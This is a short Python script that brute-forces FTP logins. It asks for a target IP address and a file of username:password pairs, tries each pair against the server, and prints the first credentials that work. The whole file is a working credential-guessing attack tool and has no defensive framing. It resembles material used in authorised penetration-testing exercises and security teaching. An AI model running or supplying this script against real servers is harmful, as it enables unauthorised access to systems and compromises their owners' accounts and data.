#!/usr/bin/python

import ftplib


def bruteLogin(hostname, passwdFile):
	try:
		pF = open(passwdFile, "r")
	except:
		print("[!] File Doesnt Exist !")
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\n')
		print("[+] Trying: " + userName + "/" + passWord)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(userName, passWord)
			print("[+] Login Suceeded With: " + userName + "/" + passWord)
			ftp.quit()
			return (userName, passWord)
		except:
 			pass
	print("[-] Password Not In List")

host = input("[*] Enter Targets IP Address: ")
passwdFile = input("[*] Enter User/Password File Path: ")
bruteLogin(host, passwdFile)


